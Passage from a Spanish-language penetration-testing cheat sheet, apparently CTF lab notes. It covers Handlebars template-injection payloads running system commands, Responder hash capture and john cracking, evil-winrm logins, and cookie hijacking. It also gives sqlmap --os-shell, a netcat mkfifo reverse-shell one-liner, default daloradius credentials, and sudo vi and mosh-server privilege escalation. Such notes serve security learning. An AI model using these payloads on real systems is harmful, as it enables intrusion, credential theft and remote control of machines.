+                        Copiamos este payload y lo codificamos en URL para que se transmita correctamente al servidor. En la pestaña decoder de Burp Suite, introducimos el código y en la 
+                        pestaña “Encode as” seleccionamos URI. El código devuelto, lo pegamos en el valor del parámetro email, en la pestaña Repeater.
+
+                        Al pulsar Send, devuelve el error "ReferenceError: require is not defined". El código anterior intenta cargar el módulo Child Process en memoria y usarlo para ejecutar 
+                        comandos del sistema. Usamos este objeto para cargar un módulo de la siguiente manera:
+
+                            {{#with string.split as |codelist|}}
+                                {{this.pop}}
+                                {{this.push "return process;"}}
+                                {{this.pop}}
+
+                        El objeto requerido se ha llamado correctamente y el módulo child_list se ha cargado. Ahora ejecutamos comandos del sistema: 
+
+                            {{#with string.split as |codelist|}}
+                                {{this.pop}}
+                                {{this.push "return process.mainModule.require('child_process').execSync('whoami');"}}
+                                {{this.pop}}
+
+                        Nos devuelve un objeto root, por lo que introduciremos "ls /root" y nos devuelve un objeto llamado flag. Para leerlo, se introduce la siguiente línea: 
+
+                            {{#with string.split as |codelist|}}
+                                {{this.pop}}
+                                {{this.push "return process.mainModule.require('child_process').execSync('cat /root/flag.txt');"}}
+                                {{this.pop}}
+
+            · SQL Injection - sqlmap -u <IP>
+
+            · F12 o CURL - Buscamos campos posibles
+
+    1️⃣4️⃣ Con la herramienta RESPONDER (snnifer), para buscar credenciales a través del hash
+
+        - Si se escuchan peticiones → cat /usr/share/responder/Responder.conf
+
+        - sudo python3 /usr/share/responder/Responder.py -I tun0
+
+        - Obtener contraseña en hash → http://<DOMAIN>/?page=//<IP_USER>/somefile
+
+        - Copiar hash
+
+        - Guardar en fichero → echo '<HASH>' → hash.txt
+
+        - Descifrar con john
+
+    1️⃣5️⃣ Con la herramienta john the ripper, obtener las credenciales para poder logearnos
+					
+        - Se puede descomprimir un zip 
+
+        - zip2john <ZIP>.zip > <FILE>.hash
+
+        - ls 
+
+        - Averiguar la contraseña del zip → john --show <FILE>.hash
+
+        - Introducir la contraseña en el zip y descomprimirlo → unzip -P <PASS> <ZIP>.zip
+
+        - Descifrar el hash → john -w=/usr/share/wordlists/rockyou.txt hash.txt
+
+        - Nos devuelve la pass y user
+
+        - Utilizar Elvil-WinRM para logearnos
+		
+    1️⃣6️⃣ Con la herramienta Evil-WinRM
+    
+        · Conectarnos con user y pass → evil-winrm -i <IP> -u <USER> -p <PASS>
+
+        · En Windows se suele usar el user "Administrator"
+
+    1️⃣7️⃣ Cookies
+
+        ➡️ Storage
+
+            · Podemos ver información sobre los usuarios.
+            · Datos del usuario. Por ejemplo: 
+
+                Name > PHPSESSID
+                Value > go5a8stp2s0br2da69klhrdt8r
+                Domain> <IP>
+
+            · Si conocemos los datos del administrador, podemos cambiar el nombre del usuario y su id para poder acceder a algún sitio donde solo pueda acceder el administrador. 
+
+        ➡️ Reverse shell con sqlmap
+
+            Con el siguiente comando, se ejecutará una reverse shell entre la máquina víctima y la atacante:
+
+                sqlmap -u "http://<IP>/dashboard.php?search='" --cookie=PHPSESSID=go5a8stp2s0br2da69klhrdt8r --os-shell
+
+            Ahora se va a levantar un listener con el siguiente comando: 
+
+                nc -lvnp 4444
+
+            En el resultado de ejecutar el comando anterior de sqlmap, introduciremos el siguiente comando para conectarnos a la shell abierta en la máquina víctima: 
+
+                rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP_LOCAL> 4444>/tmp/f
+
+            Y pulsamos la tecla a. Ahora en la terminal donde hemos ejecutado el listener, estabilizamos la shell con el siguiente comando: 
+
+                python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+            Navegamos por los distintos directorios hasta conseguir la contraseña y conectarnos a través del siguiente comando: 
+
+                sudo -l 
+
+            Usaremos una escalada de privilegios con gtfobins/vi. Para ello, visitamos la web:
+
+                https://gtfobins.github.io/gtfobins/vi/#sudo   
+
+            Y abrimos el fichero con permisos de sudo. Introducimos el siguiente comando: 
+
+                sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
+
+            E introducimos la contraseña. Ahora nos saldrá una línea de PostgreSQL. En la linea de abajo se introducirá el siguiente comando: 
+
+                :set Shell=/bin/sh
+                :shell
+                          
+            Una vez realizado estos pasos, estaremos dentro de administrador. Para comprobarlo, introducimos el comando "whoami"
+
+    1️⃣8️⃣ Ficheros pcap (Wireshark)
+
+        Este tipo de ficheros contiene los paquetes (tanto request como response), lo que puede contener información interesante como las credenciales. 
+
+            Opción 1. Desde el terminal 
+
+                sudo apt install tshark
+
+                tshark -r 0.pcap
+
+            Opción 2. Con la herramienta Wireshark
+
+    1️⃣9️⃣ Servidores
+
+        ➡️ Dalorius (Apache2)
+
+            Para saber un posible usuario, servidor o demás información usamos el siguiente comando: 
+
+                snmpwalk -v2c -c public <IP_víctima>
+
+            Una vez averiguado que se trata del servidor "dalorius", se realiza una enumeración usando el servidor econtrado:
+
+                dirsearch -u http://<IP_víctima>/daloradius/
+
+            Tenemos varios directorios pero no nos dice nada interesante. Buscamos en internet como loguearse con dalorius y nos da la siguiente ruta. 
+
+                http://<IP_víctima>/daloradius/app/operators/login.php
+
+            Al no tener las credenciales, buscamos en el navegador si existe algunas credenciales para el servidor: 
+
+                User: administrador
+                Password: radius
+
+            Una vez dentro, vemos que hay un usuario y una contraseña encriptada. Una vez desencriptada nos conectamos mediante ssh. 
+
+            Para acceder a privilegios de administrador, usamos el siguiente comando: 
+
+                sudo -l 
+
+            Y nos devuelve la siguiente ruta: 
+
+                /usr/bin/mosh-server
+
+            Para obtener permisos de privilegios introducimos la siguiente ruta y ya estaremos dentro: 
+
+                mosh --server="sudo /usr/bin/mosh-server" localhost
